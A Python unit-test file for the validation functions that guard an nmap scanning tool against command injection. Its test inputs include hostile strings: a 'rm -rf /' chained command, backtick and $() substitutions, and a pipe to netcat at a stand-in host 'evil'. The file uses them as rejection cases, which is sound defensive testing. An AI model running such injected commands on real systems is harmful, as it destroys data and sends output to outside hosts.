"""Unit tests for core/nmap.py — pure nmap-request validation.

validate_nmap_target / validate_nmap_args / validate_nmap_request are the single
validation implementation shared by the CLI `nmap` command, the webdash
POST /api/nmap route (boundary 400 before a background run launches), and
PentesterRecon's agent-side guard. They are the command-injection boundary for a
Tier 4 dangerous op: target must be IP/CIDR/RFC-1123 hostname, and args are
shlex-tokenized with shell metacharacters rejected.
"""

from __future__ import annotations

import pytest

from core.nmap import validate_nmap_args, validate_nmap_request, validate_nmap_target


def test_valid_ip_cidr_hostname_accepted():
    assert validate_nmap_target("10.0.0.5") == "10.0.0.5"
    assert validate_nmap_target("10.0.0.0/24") == "10.0.0.0/24"
    assert validate_nmap_target("scanme.example.com") == "scanme.example.com"


def test_malformed_target_rejected():
    with pytest.raises(ValueError):
        validate_nmap_target("evil;target")


def test_args_tokenized():
    assert validate_nmap_args("-sV -p 80,443") == ["-sV", "-p", "80,443"]


def test_shell_metachar_in_args_rejected():
    # Each would break argv -> shell if not rejected before execution.
    for bad in ["-sV; rm -rf /", "-oN `whoami`", "-p $(id)", "-sV | nc evil 1"]:
        with pytest.raises(ValueError):
            validate_nmap_args(bad)


def test_request_bundles_validated_fields():
    assert validate_nmap_request("10.0.0.5", "-sV -p 22") == {
        "target": "10.0.0.5",
        "nmap_args": "-sV -p 22",
        "args_tokens": ["-sV", "-p", "22"],
    }


def test_request_rejects_bad_target():
    with pytest.raises(ValueError):
        validate_nmap_request("not a host!!", "-sV")
